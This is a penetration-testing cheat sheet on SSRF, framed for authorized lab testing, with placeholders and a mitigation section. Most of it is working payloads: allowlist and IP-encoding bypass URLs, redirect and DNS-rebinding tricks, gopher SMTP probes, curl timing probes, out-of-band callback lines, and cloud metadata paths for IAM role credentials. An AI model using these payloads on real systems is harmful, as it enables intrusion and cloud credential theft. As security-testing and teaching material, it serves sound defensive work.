## 🌐 SSRF (Server-Side Request Forgery) Cheat Sheet

> **Scope:** Authorized testing only. Use lab targets or systems you have explicit written permission to assess. All values are synthetic (`<TARGET>`, `<PARAM>`, `<HOST>`, `<OOB-HOST>`, `<ROLE>`); never store captured flags, cloud keys, or tokens.
---
### 🧭 **1. Quick Reference**

| URL / scheme | Typical use |
|--------------|-------------|
| `http://127.0.0.1:<PORT>/` | Loopback services hidden from the internet |
| `http://<HOST>/` | Internal host reachable from the server |
| `file:///etc/passwd` | Local file read if the client library allows it |
| `gopher://<HOST>:<PORT>/_<RAW>` | Raw TCP (SMTP / other text protocols) |
| `dict://`, `ftp://`, `ldap://`, `jar:`, `netdoc:` | Library-dependent scheme behavior |
| `https://<OOB-HOST>/` | Blind callback and OOB proof |

Determine: which schemes are allowed, whether redirects are followed, and what detail is returned (body, status, timing, errors).

### 🔍 **2. Detection**

```http
GET http://<TARGET>/fetch?url=http://127.0.0.1:<PORT>/ HTTP/1.1
Host: <TARGET>
```
```http
POST http://<TARGET>/proxy HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"<PARAM>":"http://<OOB-HOST>/ssrf-probe"}
```
```text
url=http://<HOST>/internal
url=file:///etc/hostname
url=gopher://<OOB-HOST>:<PORT>/_SSRF_POC
```

| Signal | Meaning |
|--------|---------|
| Full body returned | Direct SSRF — enumerate internal endpoints |
| Closed vs open port error/timing differs | Port-scan oracle |
| Callback, empty response | Blind SSRF — OOB/timing only |
| "URL not allowed" | Allowlist to bypass |

### 💥 **3. Impact Classes**

1. Server itself — loopback admin panels, localhost APIs, file reads.
2. Internal systems — hosts in the server's VPC/LAN unreachable externally.
3. Blind/OOB — no body; confirm via DNS/HTTP callback or delay.
4. Cloud metadata — instance metadata and, in weak setups, role credentials.
5. Protocol chaining — raw TCP via `gopher://`.

### 🛡️ **4. Whitelist and Parser Bypasses**

| Defense | Bypass idea |
|---------|-------------|
| Starts with `http://trusted.com` | `http://trusted.com.<OOB-HOST>/` |
| Host allowlist | `http://<OOB-HOST>/?x=trusted.com` |
| Substring match | `http://trusted.com@<OOB-HOST>/` |
| Block `127.0.0.1` literal | Decimal / octal / hex encodings |
| Block IPv4 loopback | IPv6 or IPv4-mapped IPv6 |
| Decode once | Double-encode separators |
| Redirects not revalidated | 302 from allowed host → internal target |

```text
http://<OOB-HOST>@127.0.0.1:80/
http://127.0.0.1#<OOB-HOST>/
http://127.0.0.1?<OOB-HOST>
http://<TRUSTED-HOST>.<OOB-HOST>/
//<OOB-HOST>/path
```
```text
http://127.1/
http://2130706433/          (decimal 127.0.0.1)
http://0177.0.0.1/          (octal)
http://0x7f.0.0.1/          (hex)
http://[::1]/
http://[::ffff:127.0.0.1]/
http://0x7f000001/
```
```text
%68%74%74%70%3a%2f%2f127.0.0.1%2f
http://127.0.0.1%252f%252f<OOB-HOST>/
http:\/\/127.0.0.1\/
```
Which form works depends on the HTTP client and validation layer — test against the real stack.

### 🔁 **5. Redirects and DNS Rebinding**

```http
HTTP/1.1 302 Found
Location: http://127.0.0.1:<PORT>/admin
```
- Many fetchers validate the first URL, then follow redirects unvalidated. Host an authorized redirector on `<OOB-HOST>`.
- Chained redirects (allowed host → intermediate → internal) beat one-step checks.
- Rebinding: `<OOB-HOST>` first resolves to a permitted IP, then to loopback/internal with a short TTL (TOCTOU between validation and connect).

### ☁️ **6. Cloud Metadata**

| Provider | Endpoint | Header needed |
|----------|----------|---------------|
| **AWS** | `http://169.254.169.254/latest/meta-data/` | none (v1); token for IMDSv2 |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
| **Alibaba** | `http://100.100.100.200/latest/meta-data/` | none |

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
http://169.254.169.254/latest/user-data
http://metadata.google.internal/computeMetadata/v1/instance/
```
AWS IMDSv2 requires `PUT /latest/api/token` plus an `X-aws-ec2-metadata-token` header (reachable via header injection / raw-protocol SSRF). **Never copy returned secrets into notes** — record reachability only.

### 👁️ **7. Blind / OOB Confirmation**

```text
http://<OOB-HOST>/ssrf?marker=<PARAM>
http://<OOB-HOST>:<PORT>/_gopher_probe
gopher://<OOB-HOST>:25/_EHLO%20<USER>%0D%0AQUIT%0D%0A
```
```bash
curl -s -o /dev/null -w '%{time_total}\n' 'http://<TARGET>/fetch?url=http://<OOB-HOST>:<CLOSED_PORT>/'
curl -s -o /dev/null -w '%{time_total}\n' 'http://<TARGET>/fetch?url=http://127.0.0.1:<OPEN_PORT>/'
```
Use a unique marker per parameter and correlate request/listener timestamps.

### 🛠️ **8. Tools**

| Tool | Use |
|------|-----|
| **Burp Collaborator** | DNS/HTTP OOB detection |
| **Burp Repeater** | URL and redirect manipulation |
| **ffuf / SSRFmap** | Host/port fuzzing and lab exploitation |
| **`curl` / netcat** | Timing and raw-protocol experiments |

### 🔐 **9. Mitigation**

- Avoid user-controlled URLs; if unavoidable, strict allowlist of schemes, hosts, and ports.
- Resolve hostnames yourself, validate the IP, then connect to that **pinned IP**; block loopback, link-local (`169.254.0.0/16`), private ranges, IPv6 equivalents, metadata addresses.
- Disable unused schemes (`file`, `gopher`, `dict`, `jar`); disallow redirects or revalidate every hop.
- Egress firewall / segmentation so the fetcher cannot reach internal services or metadata.
- Strip userinfo, fragments, and normalize encoding before validation.
- Require IMDSv2 with hop limit 1; log unusual schemes/internal addresses.

### ✅ **10. Testing Checklist**

- [ ] Authorization/scope and OOB listener confirmed.
- [ ] Response behavior: body, error, timing, or blind.
- [ ] Schemes/ports, IP encodings, redirect chain, rebinding documented (lab only).
- [ ] Metadata reachability checked without saving secrets.
- [ ] Findings use synthetic placeholders only.

### 📚 **11. References**

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

**🌐 Happy Hacking!**
